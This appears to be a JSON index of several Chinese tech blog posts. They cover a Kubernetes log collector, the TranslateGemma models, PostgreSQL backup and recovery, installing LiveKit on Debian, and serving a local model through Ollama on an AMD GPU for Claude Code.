[{"content":"自荐一个 Kubernetes 的日志采集软件：envlog\nhttps://github.com/zhangrr/envlog\n软件最大优势 采集容器内自定义文件 阿里的SLS有个最大的优势，可以在Deployment中宣告pod容器内的文件路径，然后就会自动采集。 Docker引擎可以很容易搜索pod路径，Containerd做起来比较费劲。 但这也是最吸引人的特性，如果只采集stdout，那随便什么软件loki、filebeat都可以，就没什么吸引力。 这个困扰了我很多年，终于在AI的加持下实现了： 例如我们要采集 Pod 内的文件 /tmp/logtest.log：\n- env:\r- name: envlog_ngtest\rvalue: \u0026#34;/tmp/logtest.log\u0026#34; ​\n该模式会尝试将容器内路径映射到宿主机路径（优先使用 volume mount，其次使用容器 overlay upperdir），并生成对应的 Filebeat paths。 然后发往ES、Kafka比较好，本软件优化了ES的字段，去掉了多余的字段，也便于阅读。 这也是本软件最大的特色！\n然后我们去ES的Kibana面板，Management \u0026ndash;\u0026gt; Stack Management\n建立Index Patterns\n然后去 Analytics \u0026ndash;\u0026gt; Discover\n就可以看到日志的详细内容了：\n字段做了优化，不需要的字段统统都舍弃了，保留了必要的字段和日志的详细内容。\n","permalink":"https://rendoumi.com/posts/20260214_envlog/","summary":"\u003cp\u003e自荐一个 Kubernetes 的日志采集软件：envlog\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/zhangrr/envlog\"\u003ehttps://github.com/zhangrr/envlog\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"软件最大优势\"\u003e软件最大优势\u003c/h3\u003e\n\u003ch4 id=\"采集容器内自定义文件\"\u003e采集容器内自定义文件\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e阿里的SLS有个最大的优势，可以在Deployment中宣告pod容器内的文件路径，然后就会自动采集。\u003c/li\u003e\n\u003cli\u003eDocker引擎可以很容易搜索pod路径，Containerd做起来比较费劲。\u003c/li\u003e\n\u003cli\u003e但这也是最吸引人的特性，如果只采集stdout，那随便什么软件loki、filebeat都可以，就没什么吸引力。\u003c/li\u003e\n\u003cli\u003e这个困扰了我很多年，终于在AI的加持下实现了：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e例如我们要采集 Pod 内的文件 \u003ccode\u003e/tmp/logtest.log\u003c/code\u003e：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e    - env:\r\n      - name: envlog_ngtest\r\n        value: \u0026#34;/tmp/logtest.log\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e​\u003c/p\u003e\n\u003cp\u003e该模式会尝试将容器内路径映射到宿主机路径（优先使用 volume mount，其次使用容器 overlay upperdir），并生成对应的 Filebeat \u003ccode\u003epaths\u003c/code\u003e。 然后发往ES、Kafka比较好，本软件优化了ES的字段，去掉了多余的字段，也便于阅读。 这也是本软件最大的特色！\u003c/p\u003e\n\u003cp\u003e然后我们去ES的Kibana面板，Management \u0026ndash;\u0026gt; Stack Management\u003c/p\u003e\n\u003cp\u003e建立Index Patterns\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260214092942892\" loading=\"lazy\" src=\"/posts/20260214_envlog/image-20260214092942892.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后去 Analytics \u0026ndash;\u0026gt; Discover\u003c/p\u003e\n\u003cp\u003e就可以看到日志的详细内容了：\u003c/p\u003e\n\u003cp\u003e字段做了优化，不需要的字段统统都舍弃了，保留了必要的字段和日志的详细内容。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260214093107822\" loading=\"lazy\" src=\"/posts/20260214_envlog/image-20260214093107822.png\"\u003e\u003c/p\u003e","title":"自推荐一个Kubernetes的日志手机采集软件"},{"content":"看到一个非常有趣的例子，分享一下，TranslateGemma以及其应用：\n首先，TranslateGemma是什么？\nTranslateGemma 是一套以 Gemma 3 为基础打造的开放式翻译模型，提供 4B（4 亿）、12B（12 亿）、27B（27 亿）三种参数规模，对应不同的使用场景。支持500组语言，可以识图，识别PDF中的文字。\nTranslateGemma 的最大优势在于“可根据设备规模选择模型”，针对不同的计算环境提供了多种版本：\n4B（40 亿）版本：已针对移动设备与边缘设备进行优化，适合进行离线翻译或内置于 App 中实时使用。 12B（120 亿）版本：可在笔记本电脑或本地环境顺畅运行，将研究级别的翻译能力带入本机。 27B（270 亿）版本：主打追求最高保真度，适合部署于云端 GPU 或 TPU 环境，例如单颗 NVIDIA H100 或 Google TPU。 嘿嘿，我们可以直接在Huggingface下载模型文件，然后在ollama里用\nhttps://huggingface.co/collections/google/translategemma\nhttps://www.kaggle.com/models/google/translategemma/\n那更近一步，有个软件，叫做GPT旅行翻译神奇\n安装之后，点击设定，可以启用离线模式，就下载的是TranslateGemma 4B的模型\n启动离线模式，没有网的状态下就可以进行翻译：\n我的手机有点逊色，iphone 12 Pro MAX有点费劲，主流的iphone 16应该很流畅\n这也算是大模型的立即应用了。\n","permalink":"https://rendoumi.com/posts/20260205-gemma/","summary":"\u003cp\u003e看到一个非常有趣的例子，分享一下，TranslateGemma以及其应用：\u003c/p\u003e\n\u003cp\u003e首先，TranslateGemma是什么？\u003c/p\u003e\n\u003cp\u003eTranslateGemma 是一套以 Gemma 3 为基础打造的开放式翻译模型，提供 4B（4 亿）、12B（12 亿）、27B（27  亿）三种参数规模，对应不同的使用场景。支持500组语言，可以识图，识别PDF中的文字。\u003c/p\u003e\n\u003cp\u003eTranslateGemma 的最大优势在于“可根据设备规模选择模型”，针对不同的计算环境提供了多种版本：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e4B（40 亿）版本\u003c/strong\u003e：已针对移动设备与边缘设备进行优化，适合进行离线翻译或内置于 App 中实时使用。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e12B（120 亿）版本\u003c/strong\u003e：可在笔记本电脑或本地环境顺畅运行，将研究级别的翻译能力带入本机。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e27B（270 亿）版本\u003c/strong\u003e：主打追求最高保真度，适合部署于云端 GPU 或 TPU 环境，例如单颗 NVIDIA H100 或 Google TPU。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e嘿嘿，我们可以直接在Huggingface下载模型文件，然后在ollama里用\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://huggingface.co/collections/google/translategemma\"\u003ehttps://huggingface.co/collections/google/translategemma\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.kaggle.com/models/google/translategemma/\"\u003ehttps://www.kaggle.com/models/google/translategemma/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e那更近一步，有个软件，叫做\u003cstrong\u003eGPT旅行翻译神奇\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260205102234900\" loading=\"lazy\" src=\"/posts/20260205-gemma/image-20260205102234900.png\"\u003e\u003c/p\u003e\n\u003cp\u003e安装之后，点击设定，可以启用离线模式，就下载的是TranslateGemma 4B的模型\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260205102329809\" loading=\"lazy\" src=\"/posts/20260205-gemma/image-20260205102329809.png\"\u003e\u003c/p\u003e\n\u003cp\u003e启动离线模式，没有网的状态下就可以进行翻译：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260205102431735\" loading=\"lazy\" src=\"/posts/20260205-gemma/image-20260205102431735.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我的手机有点逊色，iphone 12 Pro MAX有点费劲，主流的iphone 16应该很流畅\u003c/p\u003e\n\u003cp\u003e这也算是大模型的立即应用了。\u003c/p\u003e","title":"大语言模型TranslateGemma的实际应用"},{"content":"那版上的Postgres恢复已经有两篇文章了，这是第三篇，数据大于天啊\n原因是看到了一篇文章：\nhttps://medium.com/engineering-playbook/i-deleted-production-database-on-friday-5-pm-heres-how-i-didn-t-get-fired-e5e53a133f9b\n我们来复盘整个过程，同事提醒自己也要同样清醒和多留备份\n一、建立**Point-in-Time Recovery (PITR)**归档 # ps axjf的结果中，看到配置文件是 /etc/postgresql/13/main/postgresql.conf # 那就修改这个配置文件 # 修改以下2行 # 启用归档 archive_mode = on # WAL 日志归档路径 archive_command = \u0026#39;cp %p /path_to_archive_directory/%f\u0026#39; # 然后重启服务生效 systemctl restart postgresql 二、建立每6小时的full backup # Cron job running every 6 hours pg_dump production_db | gzip \u0026gt; backup_$(date +%Y%m%d_%H%M%S).sql.gz 三、恢复full backup # Create new database createdb production_db # Restore from backup gunzip \u0026lt; backup_20240126_160000.sql.gz | psql production_db 四、恢复WAL log归档备份 # Restore WAL logs from 4 PM to 5 PM recovery_target_time = \u0026#39;2024-01-26 17:00:00\u0026#39; ","permalink":"https://rendoumi.com/posts/20260205-postgres_restore/","summary":"\u003cp\u003e那版上的Postgres恢复已经有两篇文章了，这是第三篇，数据大于天啊\u003c/p\u003e\n\u003cp\u003e原因是看到了一篇文章：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://medium.com/engineering-playbook/i-deleted-production-database-on-friday-5-pm-heres-how-i-didn-t-get-fired-e5e53a133f9b\"\u003ehttps://medium.com/engineering-playbook/i-deleted-production-database-on-friday-5-pm-heres-how-i-didn-t-get-fired-e5e53a133f9b\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e我们来复盘整个过程，同事提醒自己也要同样清醒和多留备份\u003c/p\u003e\n\u003ch2 id=\"一建立point-in-time-recovery-pitr归档\"\u003e一、建立**Point-in-Time Recovery (PITR)**归档\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ps axjf的结果中，看到配置文件是 /etc/postgresql/13/main/postgresql.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 那就修改这个配置文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 修改以下2行\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 启用归档\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003earchive_mode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e on\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# WAL 日志归档路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003earchive_command\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;cp %p /path_to_archive_directory/%f\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 然后重启服务生效\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart postgresql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"二建立每6小时的full-backup\"\u003e二、建立每6小时的full backup\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Cron job running every 6 hours\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg_dump production_db \u003cspan class=\"p\"\u003e|\u003c/span\u003e gzip \u0026gt; backup_\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate +%Y%m%d_%H%M%S\u003cspan class=\"k\"\u003e)\u003c/span\u003e.sql.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"三恢复full-backup\"\u003e三、恢复full backup\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create new database\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecreatedb production_db\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Restore from backup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egunzip \u0026lt; backup_20240126_160000.sql.gz \u003cspan class=\"p\"\u003e|\u003c/span\u003e psql production_db\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"四恢复wal-log归档备份\"\u003e四、恢复WAL log归档备份\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Restore WAL logs from 4 PM to 5 PM\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erecovery_target_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;2024-01-26 17:00:00\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Postgres的恢复之三"},{"content":"Livekit是个语音的套件，安装确实比较困难，步骤如下：\n准备好Debian 12，安装好Docker，因为Livekit安装脚本其实是有问题的\napt update apt install -y curl gpg wget -O - https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg echo \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \\ $(lsb_release -cs) stable\u0026#34; | tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null apt update; apt install -y docker-ce 然后直接generate安装脚本\ncd /root docker run --rm -it -v$PWD:/output livekit/generate 然后开始提问回答环节\nLiveKit Server only\n主域名：\nturn的辅助域名：\n用什么证书，当然ACME\n版本，选最新的latest\n是否用外部的redis，当然no，选内置的\n然后生成脚本\n会给一段提示\n然后我们要设置Firewall防火墙\n80 — TLS issuance 443 — primary HTTPS and TURN/TLS 443/UDP — TURN/UDP 7881 — WebRTC over TCP 50000–60000/UDP — WebRTC over UDP 80 TCP、443 TCP、443 UDP、7881 TCP、50000-60000 UDP打开\n再设置DNS解析，如果是用Cloudflare做的解析，务必只解析，不要代理，否则无法联通\n然后就编辑初始化脚本\ncd livekit.xxx.com/ chmod +x init_script.sh 编辑这个init_script.sh\n# docker已经装了，所以隐掉 #curl -fsSL https://get.docker.com -o /tmp/get-docker.sh #sh /tmp/get-docker.sh curl -L \u0026#34;https://github.com/docker/compose/releases/download/v5.0.0/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose chmod 755 /usr/local/bin/docker-compose sudo systemctl enable docker # livekit config cat \u0026lt;\u0026lt; EOF \u0026gt; /opt/livekit/livekit.yaml port: 7880 bind_addresses: - \u0026#34;\u0026#34; rtc: tcp_port: 7881 port_range_start: 50000 port_range_end: 60000 use_external_ip: false #没有独立公网ip，由true改成false 然后执行\n./init_script.sh 执行完以后啊，会在 /opt目录下产生真正的docker-compose文件，也会自启动容器\n再装客户端：\ncurl -sSL https://get.livekit.io/cli | bash livekit-cli create-token \\ --api-key \u0026lt;project_api_key\u0026gt; --api-secret \u0026lt;project_secret_key\u0026gt; \\ --join --room my-first-room --identity user1 \\ --valid-for 24h 拿到token\n然后到网站去验证：\nhttps://meet.livekit.io/?tab=custom\n这样就ok了\n客户端文档：\nhttps://docs.livekit.io/references/client-sdks/\n","permalink":"https://rendoumi.com/posts/20260204-livekit/","summary":"\u003cp\u003eLivekit是个语音的套件，安装确实比较困难，步骤如下：\u003c/p\u003e\n\u003cp\u003e准备好Debian 12，安装好Docker，因为Livekit安装脚本其实是有问题的\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install -y curl gpg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -O - https://download.docker.com/linux/debian/gpg \u003cspan class=\"p\"\u003e|\u003c/span\u003e  gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e   \u003cspan class=\"s2\"\u003e\u0026#34;deb [arch=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edpkg --print-architecture\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e   \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003elsb_release -cs\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e stable\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update\u003cspan class=\"p\"\u003e;\u003c/span\u003e apt install -y docker-ce\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后直接generate安装脚本\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /root\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run --rm -it -v\u003cspan class=\"nv\"\u003e$PWD\u003c/span\u003e:/output livekit/generate\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后开始提问回答环节\u003c/p\u003e\n\u003cp\u003eLiveKit Server only\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260204113729010\" loading=\"lazy\" src=\"/posts/20260204-livekit/image-20260204113729010.png\"\u003e\u003c/p\u003e\n\u003cp\u003e主域名：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260204113804816\" loading=\"lazy\" src=\"/posts/20260204-livekit/image-20260204113804816.png\"\u003e\u003c/p\u003e\n\u003cp\u003eturn的辅助域名：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260204113840669\" loading=\"lazy\" src=\"/posts/20260204-livekit/image-20260204113840669.png\"\u003e\u003c/p\u003e\n\u003cp\u003e用什么证书，当然ACME\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260204113912308\" loading=\"lazy\" src=\"/posts/20260204-livekit/image-20260204113912308.png\"\u003e\u003c/p\u003e\n\u003cp\u003e版本，选最新的latest\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260204113951152\" loading=\"lazy\" src=\"/posts/20260204-livekit/image-20260204113951152.png\"\u003e\u003c/p\u003e\n\u003cp\u003e是否用外部的redis，当然no，选内置的\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260204114027722\" loading=\"lazy\" src=\"/posts/20260204-livekit/image-20260204114027722.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后生成脚本\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260204114057643\" loading=\"lazy\" src=\"/posts/20260204-livekit/image-20260204114057643.png\"\u003e\u003c/p\u003e\n\u003cp\u003e会给一段提示\u003c/p\u003e","title":"Livekit的安装"},{"content":"Cluade code、Codex、Gemini三架马车是齐头并进的势头，那将来必定是Farm农场和Token战争的年代。\n那我们必须准备好，自己在局域网部署大模型，不依赖于任何的提供厂家。\n本篇就是从光杆的debian 12开始，搭配AMD 6700 xt 12G的显卡，从头搭建一个大模型服务器，供局域网的同事们使用\n一、Debian安装 光杆debian iso下载\nhttps://gemmei.ftp.acc.umu.se/cdimage/archive/12.0.0/amd64/iso-cd/debian-12.0.0-amd64-netinst.iso 用rufus刻录到U盘，然后安装\nroot用户，然后建立一个普通用户debian\n二、Debian准备驱动 # root 用户 apt update \u0026amp;\u0026amp; sudo apt upgrade -y apt install sudo # debian用户 sudo apt install -y wget gnupg2 curl software-properties-common linux-headers-$(uname -r) wget -qO - https://repo.radeon.com/rocm/rocm.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/rocm.gpg echo \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/amdgpu/6.2/ubuntu jammy main\u0026#34; | sudo tee /etc/apt/sources.list.d/amdgpu.list echo \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/rocm/apt/6.2 jammy main\u0026#34; | sudo tee /etc/apt/sources.list.d/rocm.list sudo tee /etc/apt/preferences.d/rocm-pin-600 \u0026lt;\u0026lt;EOF Package: * Pin: origin repo.radeon.com Pin-Priority: 600 EOF sudo apt update sudo apt install -y amdgpu-dkms rocm-hip-libraries rocm-hip-sdk sudo usermod -aG video,render $USER sudo reboot 然后就安装好了显卡驱动，解释一下，必须让新repo的优先级提高，才能安装！确认一下：\nrocminfo | grep gfx 看到gfx103x的代码，就OK了\n三、安装ollama # debian 用户 sudo curl -fsSL https://ollama.com/install.sh | sh 然后修改service文件\n# vi /etc/systemd/system/ollama.service [Unit] Description=Ollama Service After=network-online.target [Service] ExecStart=/usr/local/bin/ollama serve User=ollama Group=ollama Restart=always RestartSec=3 Environment=\u0026#34;PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\u0026#34; # 核心修复：强制将 gfx1031 伪装成 gfx1030 Environment=\u0026#34;HSA_OVERRIDE_GFX_VERSION=10.3.0\u0026#34; # 可选：如果你要让局域网其他人访问 Environment=\u0026#34;OLLAMA_HOST=0.0.0.0\u0026#34; [Install] WantedBy=default.target 重启\nsystemctl daemon-reload systemctl ollama restart 看看版本，拉取模型\nollama -v ollama version is 0.15.4 # 拉取模型 ollama pull qwen2.5:14b # 看看都有什么模型 curl -s http://127.0.0.1:11434/v1/models Ollama从（v0.14.0+）开始，提供了Anthropic\u0026rsquo;s Messages API，也就是说直接可以用Claude code来访问了。\n四、测试一下 先开个独立ssh窗口，观察GPU\nwatch -n 1 rocm-smi 然后测试\nollama run qwen2.5:14b \u0026#34;写一个快速排序算法\u0026#34; --verbose 看到GPU很高\n给出答案：\n当然，下面是一个使用Python编写的快速排序（Quick Sort）算法的示例。快速排序是一种非常高效的排序算法，它基于分治法的原则来工作。 ### 快速排序的基本思想： - 选择一个基准值（pivot），将数组中的元素根据与该基准值的大小关系分成两部分。 - 小于基准值的部分放在左边，大于基准值的部分放在右边。 - 对这两部分递归地进行同样的操作，直到每个子数组只有一个元素或为空。 ### Python代码实现： ```python def quick_sort(arr): if len(arr) \u0026lt;= 1: return arr # 选择基准值 pivot pivot = arr[len(arr) // 2] left = [x for x in arr if x \u0026lt; pivot] # 小于基准值的元素集合 middle = [x for x in arr if x == pivot] # 等于基准值的元素集合 right = [x for x in arr if x \u0026gt; pivot] # 大于基准值的元素集合 return quick_sort(left) + middle + quick_sort(right) # 示例使用 arr = [3, 6, 8, 10, 1, 2, 1] sorted_arr = quick_sort(arr) print(\u0026#34;排序后的数组:\u0026#34;, sorted_arr) ``` ### 解释代码： - 函数 `quick_sort` 接收一个列表（或数组）作为参数。 - 如果输入的长度小于等于1，直接返回该输入，因为单个元素或者空集已经是有序的。 - 选择中间位置的元素作为基准值 pivot。这里可以改进为随机选取以优化性能和稳定性。 - 构建三个列表：`left` 包含所有比 pivot 小的元素；`middle` 包含等于 pivot 的所有元素； `right` 包含所有大于 pivot 的元素。 - 递归地对 left 和 right 列表进行快速排序，然后将结果合并。 ### 性能和改进： - 快速排序在平均情况下的时间复杂度为 O(n log n)，但在最坏的情况下（例如输入已经完全有序），它的性能会降级到 O(n^2)。 - 为了减少发生最差情况的概率，可以选择随机元素作为基准值或者使用三数取中法选择更合适的基准值。 以上就是一个快速排序算法的完整实现。希望这对你有所帮助！如果你有任何问题或需要进一步解释，请告诉我。 total duration: 26.640771498s load duration: 9.655767337s prompt eval count: 34 token(s) prompt eval duration: 124.326028ms prompt eval rate: 273.47 tokens/s eval count: 528 token(s) eval duration: 16.361471625s eval rate: 32.27 tokens/s 五、结合Claude code claude code的安装就不说了\nexport ANTHROPIC_API_KEY=\u0026#34;\u0026#34; export ANTHROPIC_BASE_URL=\u0026#34;http://192.168.0.10:11434\u0026#34; claude --model qwen2.5:14b 然后就可以问一些问题和指导代码了，但是确认弱得可怜。\n只能片面实现一些功能，对于空手套狼，徒手建一个新项目还做不到！！\n可以参考一下。\n","permalink":"https://rendoumi.com/posts/20260203-cluadecode_qwen2.5b/","summary":"\u003cp\u003eCluade code、Codex、Gemini三架马车是齐头并进的势头，那将来必定是Farm农场和Token战争的年代。\u003c/p\u003e\n\u003cp\u003e那我们必须准备好，自己在局域网部署大模型，不依赖于任何的提供厂家。\u003c/p\u003e\n\u003cp\u003e本篇就是从光杆的debian 12开始，搭配AMD 6700 xt 12G的显卡，从头搭建一个大模型服务器，供局域网的同事们使用\u003c/p\u003e\n\u003ch3 id=\"一debian安装\"\u003e一、Debian安装\u003c/h3\u003e\n\u003cp\u003e光杆debian iso下载\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://gemmei.ftp.acc.umu.se/cdimage/archive/12.0.0/amd64/iso-cd/debian-12.0.0-amd64-netinst.iso\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e用rufus刻录到U盘，然后安装\u003c/p\u003e\n\u003cp\u003eroot用户，然后建立一个普通用户debian\u003c/p\u003e\n\u003ch3 id=\"二debian准备驱动\"\u003e二、Debian准备驱动\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# root 用户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e sudo apt upgrade -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install sudo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 